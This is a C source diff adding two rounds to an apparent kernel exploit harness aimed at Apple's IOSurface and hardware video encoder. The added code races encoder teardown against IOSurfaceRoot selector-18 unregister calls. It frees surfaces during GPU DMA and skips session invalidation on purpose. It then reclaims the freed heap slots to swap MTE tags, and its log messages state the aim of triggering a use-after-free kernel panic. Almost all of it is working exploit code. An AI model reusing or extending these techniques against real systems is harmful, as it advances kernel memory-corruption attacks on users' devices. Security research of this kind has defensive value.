@@ -1635,6 +1635,207 @@ static void *p13_render_loop(void *arg) {
     return NULL;
 }
 
+/* r259: combined encoder + sel18 unregister race */
+static volatile int r259_run = 0;
+static volatile int r259_encode_cycles = 0;
+static volatile int r259_unreg_ok = 0;
+static volatile int r259_unreg_fail = 0;
+
+static void r259_cb(void *ctx, void *src, OSStatus status,
+                     VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
+    (void)ctx; (void)src; (void)status; (void)flags; (void)buf;
+}
+
+static void *r259_encode_fn(void *arg) {
+    (void)arg;
+    int w = 128, h = 128;
+
+    while (r259_run) {
+        VTCompressionSessionRef session = NULL;
+        CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+            NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+        OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+            kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, r259_cb, NULL, &session);
+        CFRelease(enc_spec);
+        if (st != noErr || !session) { usleep(1000); continue; }
+
+        VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+        VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+        st = VTCompressionSessionPrepareToEncodeFrames(session);
+        if (st != noErr) { VTCompressionSessionInvalidate(session); CFRelease(session); continue; }
+
+        int base = r259_encode_cycles * 100;
+        for (int i = 0; i < 16 && r259_run; i++) {
+            /* Create IOSurface-backed pixel buffer */
+            IOSurfaceRef surf = NULL;
+            {
+                CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int bpe = 4, bpr = w * bpe, pf = 0x42475241;
+                CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                CFNumberRef hn_cf = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                CFNumberRef rn_cf = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn_cf);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+                CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn_cf);
+                CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+                surf = IOSurfaceCreate(props);
+                CFRelease(wn); CFRelease(hn_cf); CFRelease(bn); CFRelease(rn_cf); CFRelease(pfn);
+                CFRelease(props);
+            }
+            if (!surf) continue;
+
+            CVPixelBufferRef pb = NULL;
+            CVPixelBufferCreateWithIOSurface(NULL, surf, NULL, &pb);
+            if (!pb) { CFRelease(surf); continue; }
+
+            CVPixelBufferLockBaseAddress(pb, 0);
+            void *pbase = CVPixelBufferGetBaseAddress(pb);
+            if (pbase) memset(pbase, (base+i) & 0xFF, w*h*4);
+            CVPixelBufferUnlockBaseAddress(pb, 0);
+
+            CMTime pts = CMTimeMake(base+i, 30);
+            CMTime dur = CMTimeMake(1, 30);
+            VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
+
+            /* Release userspace refs — encoder kernel side still holds IOSurface */
+            CVPixelBufferRelease(pb);
+            CFRelease(surf);
+        }
+
+        /* Skip VTCompressionSessionInvalidate — it synchronously drains the GPU queue.
+           Just CFRelease without invalidation — undefined behavior that may not wait
+           for GPU DMA completion before freeing kernel resources. */
+        CFRelease(session);
+        __sync_fetch_and_add(&r259_encode_cycles, 1);
+    }
+    return NULL;
+}
+
+static void *r259_unreg_fn(void *arg) {
+    io_connect_t conn = (io_connect_t)(uintptr_t)arg;
+    uint64_t inp[3] = {1, 2, 3};
+    while (r259_run) {
+        kern_return_t kr = IOConnectCallMethod(conn, 18, NULL, 0, inp, 24, NULL, NULL, NULL, NULL);
+        if (kr == 0) __sync_fetch_and_add(&r259_unreg_ok, 1);
+        else __sync_fetch_and_add(&r259_unreg_fail, 1);
+    }
+    return NULL;
+}
+
+/* r260: heap reclaim UAF — free IOSurface during encoder DMA, immediately
+   reclaim the zone slot with a new allocation to change MTE tag */
+static volatile int r260_run = 0;
+static volatile int r260_submitted = 0;
+static volatile int r260_reclaimed = 0;
+static volatile int r260_cycles = 0;
+
+static void r260_cb(void *ctx, void *src, OSStatus status,
+                     VTEncodeInfoFlags flags, CMSampleBufferRef buf) {
+    (void)ctx; (void)src; (void)status; (void)flags; (void)buf;
+}
+
+static void *r260_churn_fn(void *arg) {
+    (void)arg;
+    int w = 128, h = 128;
+    int bpe = 4, bpr = w * bpe, pf = 0x42475241; /* BGRA */
+    int alloc_size = w * h * bpe;
+
+    /* Create a persistent encoder session (don't recreate each loop) */
+    VTCompressionSessionRef session = NULL;
+    CFMutableDictionaryRef enc_spec = CFDictionaryCreateMutable(
+        NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFDictionarySetValue(enc_spec, CFSTR("EnableHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+    CFDictionarySetValue(enc_spec, CFSTR("RequireHardwareAcceleratedVideoEncoder"), kCFBooleanTrue);
+    OSStatus st = VTCompressionSessionCreate(NULL, w, h,
+        kCMVideoCodecType_HEVC, enc_spec, NULL, NULL, r260_cb, NULL, &session);
+    CFRelease(enc_spec);
+    if (st != noErr || !session) return NULL;
+
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
+    VTCompressionSessionPrepareToEncodeFrames(session);
+
+    int frame_idx = 0;
+    while (r260_run) {
+        /* Step 1: Create IOSurface */
+        CFMutableDictionaryRef props = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef wn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hn_cf = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef rn_cf = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef pfn = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), wn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), hn_cf);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), bn);
+        CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), rn_cf);
+        CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), pfn);
+        IOSurfaceRef surf = IOSurfaceCreate(props);
+        CFRelease(wn); CFRelease(hn_cf); CFRelease(bn); CFRelease(rn_cf); CFRelease(pfn);
+        CFRelease(props);
+        if (!surf) continue;
+
+        /* Step 2: Create CVPixelBuffer and submit to encoder */
+        CVPixelBufferRef pb = NULL;
+        CVPixelBufferCreateWithIOSurface(NULL, surf, NULL, &pb);
+        if (!pb) { CFRelease(surf); continue; }
+
+        CVPixelBufferLockBaseAddress(pb, 0);
+        void *base = CVPixelBufferGetBaseAddress(pb);
+        if (base) memset(base, frame_idx & 0xFF, alloc_size);
+        CVPixelBufferUnlockBaseAddress(pb, 0);
+
+        CMTime pts = CMTimeMake(frame_idx, 30);
+        CMTime dur = CMTimeMake(1, 30);
+        st = VTCompressionSessionEncodeFrame(session, pb, pts, dur, NULL, NULL, NULL);
+        if (st == noErr) __sync_fetch_and_add(&r260_submitted, 1);
+
+        /* Step 3: Release BOTH refs immediately — encoder kernel side has a DMA ref */
+        CVPixelBufferRelease(pb);
+        CFRelease(surf);
+
+        /* Step 4: Immediately create replacement IOSurfaces of SAME SIZE
+           to reclaim the freed zone slot with a new MTE tag */
+        for (int r = 0; r < 4; r++) {
+            CFMutableDictionaryRef rp = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            CFNumberRef rwn = CFNumberCreate(NULL, kCFNumberIntType, &w);
+            CFNumberRef rhn = CFNumberCreate(NULL, kCFNumberIntType, &h);
+            CFNumberRef rbn = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+            CFNumberRef rrn = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+            CFNumberRef rpf = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+            CFDictionarySetValue(rp, CFSTR("IOSurfaceWidth"), rwn);
+            CFDictionarySetValue(rp, CFSTR("IOSurfaceHeight"), rhn);
+            CFDictionarySetValue(rp, CFSTR("IOSurfaceBytesPerElement"), rbn);
+            CFDictionarySetValue(rp, CFSTR("IOSurfaceBytesPerRow"), rrn);
+            CFDictionarySetValue(rp, CFSTR("IOSurfacePixelFormat"), rpf);
+            IOSurfaceRef reclaim = IOSurfaceCreate(rp);
+            CFRelease(rwn); CFRelease(rhn); CFRelease(rbn); CFRelease(rrn); CFRelease(rpf);
+            CFRelease(rp);
+            if (reclaim) {
+                __sync_fetch_and_add(&r260_reclaimed, 1);
+                CFRelease(reclaim);
+            }
+        }
+
+        frame_idx++;
+        __sync_fetch_and_add(&r260_cycles, 1);
+
+        /* Every 32nd frame: yield to let GPU hardware process */
+        if ((frame_idx & 31) == 0) sched_yield();
+    }
+
+    /* Don't invalidate — just release (skip synchronized drain) */
+    CFRelease(session);
+    return NULL;
+}
+
 /* r258: IOSurfaceLookup race — race between lookup-by-ID and release */
 static volatile int r258_run = 0;
 static volatile int r258_created = 0;
@@ -20196,6 +20397,151 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 260) {
+            rlog("*** rounds=260: heap reclaim UAF — zone slot reuse during GPU DMA ***\n");
+            rlog("  Submit IOSurface to encoder → free it → allocate same-size to reclaim slot\n");
+            rlog("  GPU DMA accesses old pointer → new MTE tag → panic\n\n");
+
+            char r260_sp[256];
+            { char *h = getenv("HOME"); snprintf(r260_sp, sizeof(r260_sp), "%s/Documents/uaf260_state.bin", h?h:"/tmp"); }
+            int r260_att = 0;
+            { FILE *f = fopen(r260_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0260) fread(&r260_att,4,1,f); fclose(f); } }
+            r260_att++;
+            rlog("  Attempt #%d\n", r260_att);
+            { FILE *f = fopen(r260_sp, "wb"); if (f) { uint32_t m=0xDEAD0260; fwrite(&m,4,1,f); fwrite(&r260_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r260_secs = 20;
+            if (argc > 3) r260_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r260_secs);
+            fflush(stdout);
+
+            r260_run = 1;
+            r260_submitted = 0; r260_reclaimed = 0; r260_cycles = 0;
+
+            /* 3 churn threads — each has its own encoder session */
+            pthread_t r260_th[3];
+            for (int i = 0; i < 3; i++)
+                pthread_create(&r260_th[i], NULL, r260_churn_fn, (void*)(uintptr_t)i);
+
+            /* sel17/18 for kernel memory pressure */
+            io_service_t r260_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r260_conn = IO_OBJECT_NULL;
+            if (r260_svc) IOServiceOpen(r260_svc, mach_task_self(), 0, &r260_conn);
+            g_race250_conn = r260_conn;
+            g_race250_run = r260_conn ? 1 : 0;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+            pthread_t r260_t17, r260_t18;
+            if (r260_conn) {
+                pthread_create(&r260_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r260_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            for (int s = 0; s < r260_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds submit=%d reclaim=%d cycles=%d reg=%d/%d\n", s+1,
+                     r260_submitted, r260_reclaimed, r260_cycles,
+                     g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r260_run = 0;
+            g_race250_run = 0;
+            for (int i = 0; i < 3; i++) pthread_join(r260_th[i], NULL);
+            if (r260_conn) {
+                pthread_join(r260_t17, NULL);
+                pthread_join(r260_t18, NULL);
+                IOServiceClose(r260_conn);
+                IOObjectRelease(r260_svc);
+            }
+
+            rlog("\n  === SURVIVED heap reclaim race! ===\n");
+            rlog("  submit=%d reclaim=%d cycles=%d\n",
+                 r260_submitted, r260_reclaimed, r260_cycles);
+            rlog("*** r=260 complete ***\n");
+            goto done;
+        }
+        if (rounds == 259) {
+            rlog("*** rounds=259: combined encoder + sel18 unregister race ***\n");
+            rlog("  Encoder submits IOSurface-backed frames to GPU hardware\n");
+            rlog("  sel18 unregister churn on IOSurfaceRoot connection\n");
+            rlog("  Encoder teardown while GPU DMA in-flight\n\n");
+
+            char r259_sp[256];
+            { char *h = getenv("HOME"); snprintf(r259_sp, sizeof(r259_sp), "%s/Documents/uaf259_state.bin", h?h:"/tmp"); }
+            int r259_att = 0;
+            { FILE *f = fopen(r259_sp, "rb"); if (f) { uint32_t m; if (fread(&m,4,1,f)==1 && m==0xDEAD0259) fread(&r259_att,4,1,f); fclose(f); } }
+            r259_att++;
+            rlog("  Attempt #%d\n", r259_att);
+            { FILE *f = fopen(r259_sp, "wb"); if (f) { uint32_t m=0xDEAD0259; fwrite(&m,4,1,f); fwrite(&r259_att,4,1,f); fflush(f); fsync(fileno(f)); fclose(f); } }
+
+            int r259_secs = 20;
+            if (argc > 3) r259_secs = atoi(argv[3]);
+            rlog("  Duration: %d seconds\n", r259_secs);
+            fflush(stdout);
+
+            r259_run = 1;
+            r259_encode_cycles = 0; r259_unreg_ok = 0; r259_unreg_fail = 0;
+
+            /* Open IOSurfaceRoot connection for sel18 */
+            io_service_t r259_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                IOServiceMatching("IOSurfaceRoot"));
+            io_connect_t r259_conn = IO_OBJECT_NULL;
+            if (r259_svc) IOServiceOpen(r259_svc, mach_task_self(), 0, &r259_conn);
+
+            /* Encoder threads (2 parallel encoder sessions cycling) */
+            pthread_t r259_enc[2];
+            for (int i = 0; i < 2; i++)
+                pthread_create(&r259_enc[i], NULL, r259_encode_fn, (void*)(uintptr_t)i);
+
+            /* sel18 unregister threads */
+            pthread_t r259_ur[2];
+            if (r259_conn) {
+                for (int i = 0; i < 2; i++)
+                    pthread_create(&r259_ur[i], NULL, r259_unreg_fn, (void*)(uintptr_t)r259_conn);
+            }
+
+            /* Also run sel17/18 on shared connection for memory pressure */
+            g_race250_conn = r259_conn;
+            g_race250_run = r259_conn ? 1 : 0;
+            g_race250_reg_ok = 0; g_race250_reg_fail = 0;
+            g_race250_dereg_ok = 0; g_race250_dereg_fail = 0;
+            pthread_t r259_t17, r259_t18;
+            if (r259_conn) {
+                pthread_create(&r259_t17, NULL, g_race250_sel17_fn, NULL);
+                pthread_create(&r259_t18, NULL, g_race250_sel18_fn, NULL);
+            }
+
+            /* Also run p13_render_loop for compositor engagement */
+            p13_render_run = 1;
+            pthread_t r259_rl;
+            pthread_create(&r259_rl, NULL, p13_render_loop, NULL);
+
+            for (int s = 0; s < r259_secs; s++) {
+                usleep(1000000);
+                rlog("  +%ds enc_cycles=%d unreg=%d/%d reg=%d/%d\n", s+1,
+                     r259_encode_cycles, r259_unreg_ok, r259_unreg_fail,
+                     g_race250_reg_ok, g_race250_reg_fail);
+            }
+
+            r259_run = 0;
+            g_race250_run = 0;
+            p13_render_run = 0;
+            for (int i = 0; i < 2; i++) pthread_join(r259_enc[i], NULL);
+            if (r259_conn) {
+                for (int i = 0; i < 2; i++) pthread_join(r259_ur[i], NULL);
+                pthread_join(r259_t17, NULL);
+                pthread_join(r259_t18, NULL);
+            }
+            pthread_join(r259_rl, NULL);
+            if (r259_conn) { IOServiceClose(r259_conn); IOObjectRelease(r259_svc); }
+
+            rlog("\n  === SURVIVED encoder+sel18 race! ===\n");
+            rlog("  enc_cycles=%d unreg=%d/%d\n",
+                 r259_encode_cycles, r259_unreg_ok, r259_unreg_fail);
+            rlog("*** r=259 complete ***\n");
             goto done;
         }
         if (rounds == 258) {
